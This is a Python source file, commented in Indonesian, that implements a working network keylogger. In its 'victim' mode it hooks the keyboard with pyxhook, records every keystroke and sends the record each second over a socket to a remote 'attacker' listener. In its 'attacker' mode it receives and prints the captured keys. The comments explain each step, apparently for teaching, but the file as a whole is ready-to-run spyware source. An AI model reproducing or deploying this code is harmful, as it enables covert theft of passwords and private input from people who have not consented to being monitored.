import sys
import getopt
import socket
import os
import pyxhook
from time import sleep

HOST = ''
PORT = 0
LISTEN = False
VICTIM_KEY_HISTORY = ''

def OnKeyboardEvent(event):
    global VICTIM_KEY_HISTORY
    VICTIM_KEY_HISTORY += (event.Key + '\n') # menampung key dari tombol keyboard yang ditekan

def victim():
    global VICTIM_KEY_HISTORY

    s = socket.socket() # membuat socket
    s.connect((HOST, PORT)) # menghubungkan dengan attacker

    print("[*] Connection has been established")

    hookManager = pyxhook.HookManager() # membuat hook manager
    hookManager.KeyDown = OnKeyboardEvent # memanggil fungsi OnKeyboardEvent ketika tombol keyboard ditekan
    hookManager.HookKeyboard() # menyiapkan hook
    try:
        hookManager.start() # memulai pemantauan
    except KeyboardInterrupt:
        print("[-] Connection Closed, KeyLogger Disabled")

    while True:
        sleep(1) # hanya sebagai delay waktu, satuannya adalah detik
        s.send(VICTIM_KEY_HISTORY.encode()) # mengirimkan key dari tombol yang ditekan di keyboard kepada attacker
        VICTIM_KEY_HISTORY = '' 

    s.close() # menutup socket

def attacker():
    s = socket.socket() # membuat socket
    s.bind((HOST, PORT)) # menghubungkan socket dengan address
    s.listen() # memperbolehkan untuk menerima koneksi

    print("[*] Waiting for a connection")

    # ketika ada victim yang terkoneksi dengannya, maka attacker akan menerima koneksi tersebut
    # s.accept mengembalikan dua value:
    # 1. victim : yang pertama adalah socket yang merepresentasikan koneksi antara attacker dan victim
    # 2. addr   : yang kedua adalah address dari victim
    victim, addr = s.accept() 

    # mencetak address dari koneksi dengan victim
    print("[*] Connection established | {}:{}".format(addr[0], addr[1]))

    while True:
        sleep(1) # hanya sebagai delay waktu, satuannya adalah detik
        log = victim.recv(1024) # ketika mereceive byte dari yang dikirimkan oleh victim dan ditampung di variabel "log"
        log = log.decode() # mengubah byte menjadi string biasa

        if len(log) == 0: # jika panjang dari variabel "log", maka loop akan dihentikan
            break

        print(log)
        
    s.close() # menutup socket

def main():
    global HOST
    global PORT
    global LISTEN
    valid = True

    try:
        # memparse command line options dan parameter list, kemudian menampung ke variabel "args"
        args, _ = getopt.getopt(sys.argv[1:], "h:p:l")
    except:
        # jika tidak sesuai yang diminta, maka akan memberikan contoh pemakaian
        print("Usage:")
        print("1. For attacker : filename.py -p 1000 -l")
        print("2. For victim   : filename.py -h 127.0.0.1 -p 1000")
        return

    # meloop semua value yang ada pada variabel "args"
    # karena variabel "args" ini memiliki key dan value, maka kita akan memisah value menjadi key dan value
    for key, value in args:
        if key == "-h": # jika keynya adalah -h
            # memvalidasi ip menggunakan method bawaan dari socket
            try:
                socket.inet_aton(value)
                HOST = value
            except socket.error:
                print("Invalid IP Address")
                valid = False
        elif key == "-p": # jika keynya adalah -p
            # memvalidasi ip harus berupa integer
            try:
                PORT = int(value)
            except:
                print("Port must be a number")
                valid = False
        elif key == "-l": # jika keynya adalah -l
            LISTEN = True

    if LISTEN and valid: # jika ternyata dia sebagai listener dan semua validasi benar
        attacker() # memanggil fungsi attacker
    elif not LISTEN and valid: # jika ternyata dia bukan listener dan semua validasi benar
        victim() # memanggil fungsi victim

# mengecek apakah fungsi yang dipanggilnya itu bernama "main"
# - jika bernama main, akan mengembalikan nilai True sehingga fungsi "main" dijalankan
# - jika tidak bernama main, akan mengembalikan nilai False sehingga fungsi "main" tidak dijalankan
if __name__ == "__main__":
    main() # memanggil fungsi main